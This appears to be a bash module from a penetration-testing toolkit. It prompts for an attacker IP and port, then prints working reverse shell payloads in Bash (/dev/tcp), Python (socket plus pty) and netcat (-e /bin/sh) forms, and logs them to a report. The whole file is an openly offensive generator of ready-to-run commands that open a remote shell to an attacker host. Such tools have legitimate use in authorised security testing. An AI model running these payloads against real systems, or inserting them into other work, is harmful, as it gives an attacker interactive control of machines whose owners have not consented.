#!/bin/bash

BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
UTILS_DIR="$BASE_DIR/utils"

if [[ -f "$UTILS_DIR/common.sh" ]]; then
  source "$UTILS_DIR/common.sh"
elif [[ -f "$UTILS_DIR/colors.sh" ]]; then
  source "$UTILS_DIR/colors.sh"
fi

load_current_language

GREEN="${GREEN:-}"
CYAN="${CYAN:-}"
BOLD="${BOLD:-}"
RESET="${RESET:-}"

print_payload() {
  local title="$1"
  local payload="$2"

  print_info "$title"
  echo "    $payload"
  echo
  log_message "INFO" "Reverse shell payload generated [$title]: $payload"
}

main() {
  ensure_runtime
  register_module "reverse"
  local attacker_ip
  local attacker_port

  print_header "$TXT_REVERSE_HEADER"
  read -r -p "$TXT_REVERSE_IP_PROMPT" attacker_ip
  read -r -p "$TXT_REVERSE_PORT_PROMPT" attacker_port

  if [[ -z "$attacker_ip" || -z "$attacker_port" ]]; then
    print_error "$TXT_REVERSE_REQUIRED"
    log_message "ERROR" "Reverse shell generator called without IP or port"
    return 1
  fi

  echo
  print_payload "Bash" "bash -i >& /dev/tcp/${attacker_ip}/${attacker_port} 0>&1"
  print_payload "Python" "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"${attacker_ip}\",${attacker_port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"
  print_payload "Netcat" "nc -e /bin/sh ${attacker_ip} ${attacker_port}"
  append_report "INFO" "$TXT_REVERSE_REPORT ${attacker_ip}:${attacker_port}"
}

run_module() {
  main
}
